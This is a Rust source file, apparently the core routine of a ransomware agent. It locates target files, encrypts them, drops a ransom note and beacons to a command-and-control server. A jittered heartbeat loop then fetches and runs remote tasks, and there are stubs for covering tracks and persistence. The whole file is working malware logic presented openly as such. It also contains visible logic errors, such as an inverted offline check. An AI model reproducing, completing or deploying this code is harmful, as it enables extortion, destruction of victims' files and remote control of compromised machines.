use rand::Rng;
use tokio::task::JoinHandle;
use std::io::{self, Write};
use local_ip_address::local_ip;
use std::sync::Arc;
use tokio::sync::{Mutex, mpsc};


use crate::utils::{logger, note, config::AppConfig};
use crate::core::targeting;
use crate::post::{
    command_handler,
    commands::{AgentCommand, ResultQueue}
};
use crate::crypto::encryption;
use crate::communication::beacon;



pub async fn ransom(logger: &logger::Logger, config: &AppConfig) -> Result<(), Box<dyn std::error::Error>> {
    logger.init_file_logging(&config.log_path)?; // Change later
    
    let local_ip = local_ip()?;
    logger.log(&format!("Ransomware Program starting on local IP: {}", local_ip));

    // Step 1: Locate files of interest, set path to search
    let targets = targeting::discover_files(&logger, &config.target_path)?;

    dbg!(&targets);
    // Ask user if wants to continue: only for testing purposes, remove later
    if !ask_user_confirmation() {
        logger.log("User chose not to continue. Exiting...");
        return Ok(());
    }

    // Step 2: Encrypt files
    match encryption::encrypt(targets, &logger, &config.extension) {
        Ok(_) => {},
        Err(e) => logger.log(&format!("Error during encryption: {}", e)),
    }

    // Step 3: Display ransom note with instructions, place on Desktop (TODO)
    let _ = note::generate_note(&logger, &config.note_path);


    // Step 4: Send initial beacon to C2
    let (agent_id, session_id) = beacon::initial_beacon(
        &config.server_address, 
        config.retries, 
        config.timeout_seconds).await;

    
    let offline = if agent_id == 0 {
        false
    } else {
        true
    };

    if !offline {
        // Step 5: Heartbeat with jitter that polls for tasks and sends results
        let (tx, rx) = mpsc::channel::<AgentCommand>(32);
        let result_queue: ResultQueue = Arc::new(Mutex::new(None));

        // Start worker
        tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));

        let server_address = config.server_address.clone();
        let timeout_secs = config.timeout_seconds.clone();
        let tx_clone = tx.clone();
        let result_clone = Arc::clone(&result_queue);
        
        let heartbeat_handle = tokio::spawn(async move {
            loop {
                let jitter = rand::thread_rng().gen_range(0..20);
                tokio::time::sleep(std::time::Duration::from_secs(60 + jitter)).await;

                // Get results from queue
                let results = result_clone.lock().await.take();
                // Send heartbeat to C2 to requests tasks
                match beacon::heartbeat(
                    &server_address,
                    agent_id,
                    &session_id,
                    timeout_secs,
                    results
                ).await {
                    Some(msgs) => {
                        // If tasks exist, complete them and store results somewhere
                        // Send results on next heartbeat
                        for msg in msgs {
                            let _ = tx_clone.send(msg).await;
                        }
                    }
                    None => {}
                }

            }
        });

        heartbeat_handle.await?;
    } else {
        // If operating in offline mode, check every X
        let mut interval_secs = 60; // Start with 1 min (change later)
        let max_interval = 3600; // set cap at 1 hr (change later)
        
        loop {
            println!("C2 unreachable. Entering dormant mode. Retrying in {} seconds.", interval_secs); // Should log
            tokio::time::sleep(std::time::Duration::from_secs(interval_secs)).await;

            let (new_agent_id, session_id) = beacon::initial_beacon(
                &config.server_address, 
                config.retries, 
                config.timeout_seconds).await;

            if new_agent_id != 0 {
                println!("Reconnected to C2. Exiting offline mode.");
                // TODO: Reinitialize heartbeat
                let _ = heartbeat(logger, config, agent_id, session_id).await;
                break
            }

            // Back off retry interval (capped)
            interval_secs = std::cmp::min(interval_secs * 2, max_interval);
        }
    }


    



    // Step 6: Cover tracks/persistence

    Ok(())
}

async fn heartbeat(
    logger: &logger::Logger, config: &AppConfig, agent_id: u64, session_id: String) 
    -> Result<(), Box<dyn std::error::Error>> {

    // Step 5: Heartbeat with jitter that polls for tasks and sends results
    let (tx, rx) = mpsc::channel::<AgentCommand>(32);
    let result_queue: ResultQueue = Arc::new(Mutex::new(None));

    // Start worker
    tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));

    let server_address = config.server_address.clone();
    let timeout_secs = config.timeout_seconds.clone();
    let tx_clone = tx.clone();
    let result_clone = Arc::clone(&result_queue);
    let session_id = session_id.clone();
    
    let heartbeat_handle = tokio::spawn(async move {
        loop {
            let jitter = rand::thread_rng().gen_range(0..20);
            tokio::time::sleep(std::time::Duration::from_secs(60 + jitter)).await;

            // Get results from queue
            let results = result_clone.lock().await.take();
            // Send heartbeat to C2 to requests tasks
            match beacon::heartbeat(
                &server_address,
                agent_id,
                &session_id,
                timeout_secs,
                results
            ).await {
                Some(msgs) => {
                    // If tasks exist, complete them and store results somewhere
                    // Send results on next heartbeat
                    for msg in msgs {
                        let _ = tx_clone.send(msg).await;
                    }
                }
                None => {}
            }

        }
    });

    heartbeat_handle.await?;

    Ok(())

}

fn ask_user_confirmation() -> bool {
    print!("Do you want to begin encrypting? (y/n): ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    matches!(input.trim().to_lowercase().as_str(), "y" | "yes")
}

